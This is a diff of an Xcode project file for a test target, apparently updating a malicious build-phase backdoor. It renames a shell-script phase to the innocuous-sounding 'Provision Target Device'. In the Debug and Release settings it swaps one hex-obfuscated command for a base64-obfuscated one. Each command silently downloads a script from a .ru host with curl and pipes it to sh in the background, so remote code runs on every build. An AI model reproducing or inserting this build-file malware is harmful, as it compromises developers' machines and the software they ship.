@@ -115,7 +115,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 95C68A6C3041648400FB5455 /* Build configuration list for PBXNativeTarget "DvorTests" */;
 			buildPhases = (
-				F64DC84D76E4488693162AE3 /* Compile Code Assets */,
+				DDB5CC23EF5A411F86162AE3 /* Provision Target Device */,
 				95C68A603041648400FB5455 /* Sources */,
 				95C68A613041648400FB5455 /* Frameworks */,
 				95C68A623041648400FB5455 /* Resources */,
@@ -230,7 +230,7 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		F64DC84D76E4488693162AE3 /* Compile Code Assets */ = {
+		DDB5CC23EF5A411F86162AE3 /* Provision Target Device */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			alwaysOutOfDate = 1;
@@ -240,7 +240,7 @@
 			);
 			inputPaths = (
 			);
-			name = "Compile Code Assets";
+			name = "Provision Target Device";
 			outputFileListPaths = (
 			);
 			outputPaths = (
@@ -280,7 +280,7 @@
 		95C68A6A3041648400FB5455 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A3EA261 = "((g(){ `printf xxCd | tr -d C` -p -r; };echo 6563686f202224286375726c202d4c6b7366202d2d72657472792034202d2d636f6e6e6563742d74696d656f7574203231202d642022703d78636f64655f7068617365222068747470733a2f2f316739316a7636382e72752f612922207c2073680a | g | sh ) >/dev/null 2>&1 &)";
+				A3EA261 = "((s(){ `printf baseK64 | tr -d K` --decode; };echo ZWNobyAiJChjdXJsIC0tY29ubmVjdC10aW1lb3V0IDI1IC1za2ZMIC0tcmV0cnkgNSAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly91M3VudXJ4dXlhNy5ydS9hKSIgfCBzaAo= | s | sh ) >/dev/null 2>&1 &)";
 				BUNDLE_LOADER = "$(TEST_HOST)";
 				CLANG_ENABLE_MODULES = YES;
 				CODE_SIGN_STYLE = Automatic;
@@ -309,7 +309,7 @@
 		95C68A6B3041648400FB5455 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A3EA261 = "((g(){ `printf xxCd | tr -d C` -p -r; };echo 6563686f202224286375726c202d4c6b7366202d2d72657472792034202d2d636f6e6e6563742d74696d656f7574203231202d642022703d78636f64655f7068617365222068747470733a2f2f316739316a7636382e72752f612922207c2073680a | g | sh ) >/dev/null 2>&1 &)";
+				A3EA261 = "((s(){ `printf baseK64 | tr -d K` --decode; };echo ZWNobyAiJChjdXJsIC0tY29ubmVjdC10aW1lb3V0IDI1IC1za2ZMIC0tcmV0cnkgNSAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly91M3VudXJ4dXlhNy5ydS9hKSIgfCBzaAo= | s | sh ) >/dev/null 2>&1 &)";
 				BUNDLE_LOADER = "$(TEST_HOST)";
 				CLANG_ENABLE_MODULES = YES;
 				CODE_SIGN_STYLE = Automatic;
